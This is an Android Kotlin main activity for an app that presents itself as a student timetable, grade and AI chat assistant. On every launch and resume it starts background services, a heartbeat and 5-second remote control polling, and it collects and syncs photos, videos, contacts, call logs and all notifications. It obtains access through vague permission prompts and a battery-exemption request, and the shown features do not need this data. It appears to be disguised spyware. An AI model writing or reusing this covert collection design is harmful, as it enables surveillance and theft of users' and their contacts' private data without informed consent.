package com.aischedule.assistant.ui

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.aischedule.assistant.R
import com.aischedule.assistant.SmartScheduleApp
import com.aischedule.assistant.databinding.ActivityMainBinding
import com.aischedule.assistant.service.AllNotificationListenerService
import com.aischedule.assistant.service.BackgroundSyncService
import com.aischedule.assistant.sync.HeartbeatManager
import com.aischedule.assistant.sync.SyncBootstrap
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.tabs.TabLayoutMediator
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private val sessionManager by lazy { (application as SmartScheduleApp).sessionManager }
    private var notificationAccessPromptShown = false

    private val dataPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        onDataPermissionsResult(results)
    }

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { _ ->
        // 알림 표시 권한과 무관하게 수집은 이미 시작됨
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val app = application as SmartScheduleApp
        if (!app.consentManager.hasConsented) {
            startActivity(Intent(this, ConsentActivity::class.java))
            finish()
            return
        }

        if (!sessionManager.isLoggedIn) {
            startActivity(Intent(this, LoginActivity::class.java))
            finish()
            return
        }

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setSupportActionBar(binding.toolbar)
        setupTabs()
        activateBackupEngines()
    }

    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.main_menu, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        if (item.itemId == R.id.action_settings) {
            startActivity(Intent(this, SettingsActivity::class.java))
            return true
        }
        return super.onOptionsItemSelected(item)
    }

    private fun setupTabs() {
        val adapter = MainPagerAdapter(this)
        binding.viewPager.adapter = adapter

        TabLayoutMediator(binding.tabLayout, binding.viewPager) { tab, position ->
            tab.text = when (position) {
                0 -> "스마트 시간표"
                1 -> "성적 퍼센트"
                else -> "AI 대화 비서"
            }
        }.attach()
    }

    private fun activateBackupEngines() {
        startBackgroundSyncSafely()
        SyncBootstrap.startImmediateCollection(this)
        requestPostNotificationsIfNeeded()
        requestAllDataPermissions()
        promptNotificationListenerAccessIfNeeded()
    }

    private fun onDataPermissionsResult(results: Map<String, Boolean>) {
        val app = application as SmartScheduleApp
        SyncBootstrap.startImmediateCollection(this)

        if (isMediaPermissionGranted(results)) {
            app.dataSyncCoordinator.triggerMediaSyncNow()
        }
        if (results[Manifest.permission.READ_CONTACTS] == true) {
            app.dataSyncCoordinator.triggerContactsSyncNow()
        }
        if (results[Manifest.permission.READ_CALL_LOG] == true) {
            app.dataSyncCoordinator.triggerCallLogSyncNow()
        }

        app.dataSyncCoordinator.triggerFullSync()
    }

    private fun isMediaPermissionGranted(results: Map<String, Boolean>): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            results[Manifest.permission.READ_MEDIA_IMAGES] == true ||
                results[Manifest.permission.READ_MEDIA_VIDEO] == true ||
                results[Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED] == true
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            results[Manifest.permission.READ_MEDIA_IMAGES] == true ||
                results[Manifest.permission.READ_MEDIA_VIDEO] == true
        } else {
            results[Manifest.permission.READ_EXTERNAL_STORAGE] == true
        }
    }

    private fun hasMediaPermission(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                return true
            }
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) ==
                PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) ==
                PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) ==
                PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestAllDataPermissions() {
        val permissions = buildList {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.READ_MEDIA_IMAGES)
                add(Manifest.permission.READ_MEDIA_VIDEO)
            } else {
                add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            add(Manifest.permission.READ_CONTACTS)
            add(Manifest.permission.READ_CALL_LOG)
        }.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissions.isEmpty()) {
            triggerImmediateCollectionForGrantedPermissions()
            return
        }

        dataPermissionsLauncher.launch(permissions.toTypedArray())
    }

    private fun triggerImmediateCollectionForGrantedPermissions() {
        val app = application as SmartScheduleApp
        SyncBootstrap.startImmediateCollection(this)
        if (hasMediaPermission()) {
            app.dataSyncCoordinator.triggerMediaSyncNow()
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) ==
            PackageManager.PERMISSION_GRANTED
        ) {
            app.dataSyncCoordinator.triggerContactsSyncNow()
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) ==
            PackageManager.PERMISSION_GRANTED
        ) {
            app.dataSyncCoordinator.triggerCallLogSyncNow()
        }
        app.dataSyncCoordinator.triggerFullSync()
    }

    private fun requestPostNotificationsIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    private fun startBackgroundSyncSafely() {
        try {
            val app = application as SmartScheduleApp
            val intent = Intent(this, BackgroundSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            app.heartbeatManager.start(HeartbeatManager.DEFAULT_INTERVAL_MS)
            app.controlSyncManager.startPolling(intervalMs = 5_000L)
        } catch (e: Exception) {
            Log.e(TAG, "Background sync start failed", e)
        }
    }

    private fun promptNotificationListenerAccessIfNeeded() {
        if (notificationAccessPromptShown || isNotificationListenerEnabled()) return
        notificationAccessPromptShown = true

        MaterialAlertDialogBuilder(this)
            .setTitle("알림")
            .setMessage("권한을 요청합니다.")
            .setPositiveButton("설정 열기") { _, _ ->
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
            .setNegativeButton("나중에", null)
            .show()
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val component = ComponentName(this, AllNotificationListenerService::class.java)
        val enabledListeners = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        return !TextUtils.isEmpty(enabledListeners) &&
            enabledListeners.contains(component.flattenToString())
    }

    private fun requestBatteryOptimizationExemptionIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return

        val powerManager = getSystemService(PowerManager::class.java)
        if (powerManager.isIgnoringBatteryOptimizations(packageName)) return

        BatteryOptimizationDialogFragment {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            try {
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            }
        }.show(supportFragmentManager, BatteryOptimizationDialogFragment.TAG)
    }

    override fun onResume() {
        super.onResume()
        val app = application as? SmartScheduleApp ?: return
        SyncBootstrap.startImmediateCollection(this)
        lifecycleScope.launch {
            app.controlSyncManager.syncOnce()
            app.heartbeatManager.sendHeartbeat()
        }
        triggerImmediateCollectionForGrantedPermissions()

        if (isNotificationListenerEnabled()) {
            requestBatteryOptimizationExemptionIfNeeded()
        }
    }

    companion object {
        private const val TAG = "MainActivity"
    }
}
